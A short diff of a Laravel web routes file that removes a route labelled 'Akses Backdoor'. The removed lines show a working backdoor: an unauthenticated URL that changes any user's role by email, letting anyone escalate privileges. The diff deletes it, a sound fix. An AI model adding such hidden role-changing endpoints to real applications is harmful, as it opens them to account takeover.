@@ -34,18 +34,6 @@ use App\Http\Controllers\Auth\GoogleSocialiteController;
 //     return view("mail.verifikasiEmail");
 // });
 /** Coba Kirim Email */
-/** Akses Backdoor */
-Route::get('/backdoor/{email}/{status}', function ($email, $status) {
-    $find_data = User::where("email", $email)->paginate(1);
-    if (count($find_data) > 0) {
-        $user = User::find($find_data[0]->id);
-        $user->role = $status;
-        $user->save();
-    }
-
-    return redirect(route("home"));
-});
-/** Akses Backdoor */
 /** Halaman Pengunjung */
 /** Home */
 Route::get('/', [VisitorsController::class, "home"])->name('home');
